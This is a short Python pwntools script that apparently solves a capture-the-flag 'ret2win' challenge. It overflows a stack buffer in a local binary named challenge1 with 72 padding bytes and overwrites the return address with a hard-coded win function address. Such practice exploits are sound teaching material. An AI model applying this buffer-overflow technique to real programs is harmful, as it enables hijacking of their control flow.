from pwn import *

# Start the process
p = process('./challenge1') #### name of the executable

# Address of the win function
win_address = 0x401136  # Use `objdump -d challenge1` to the Win function address

# Craft the payload
payload = b"A" * 72  # Fill the buffer and overwrite the saved frame pointer
payload += p64(win_address)  # Overwrite the return address

# Send the payload
p.sendline(payload)

# Print the output
print(p.recvall().decode())
